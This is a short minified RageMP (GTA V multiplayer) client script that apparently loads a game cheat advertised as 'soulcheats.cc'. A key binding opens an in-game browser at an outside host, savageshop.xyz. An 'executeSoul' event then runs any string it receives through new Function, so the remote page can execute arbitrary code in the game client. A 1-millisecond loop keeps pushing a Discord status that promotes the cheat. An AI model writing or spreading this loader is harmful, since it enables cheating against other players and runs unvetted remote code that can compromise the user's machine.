let browserF = null;
function test() {
	mp.discord.update('Playing with soulcheats.cc', ':pepega:'),
		mp.gui.chat.show(!0),
		mp.gui.chat.activate(!1),
		setTimeout(() => {
			test();
		}, 1);
}
mp.keys.bind(33, !0, function () {
	null == browserF
		? (mp.gui.cursor.show(!0, !0), (browserF = mp.browsers.new('http://savageshop.xyz/soul/hateme.html')))
		: (browserF.destroy(), (browserF = null), mp.gui.cursor.show(!1, !1));
}),
	mp.events.add('executeSoul', e => {
		!(function () {
			const t = new Function('a', 'b', '(function() {' + e + '})();');
			t(100, 100);
		})();
	}),
	test();
